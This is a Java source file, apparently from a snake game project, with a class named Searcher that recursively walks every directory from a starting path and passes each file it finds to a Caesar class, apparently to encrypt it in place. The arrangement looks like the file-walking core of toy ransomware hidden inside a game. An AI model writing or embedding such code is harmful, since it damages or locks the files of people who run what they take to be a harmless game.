package me.herrlestrate.snakegame.crypto;

import java.io.File;
import java.util.Objects;

public class Searcher {

    public Searcher(){

    }

    public void start(String startPath){
        for(File target : Objects.requireNonNull((new File(startPath)).listFiles())){
            System.out.println(target.getAbsolutePath());
            if(target.isDirectory()){
                start(target.getAbsolutePath());
                continue;
            }
            new Caesar(target);
        }
    }
}
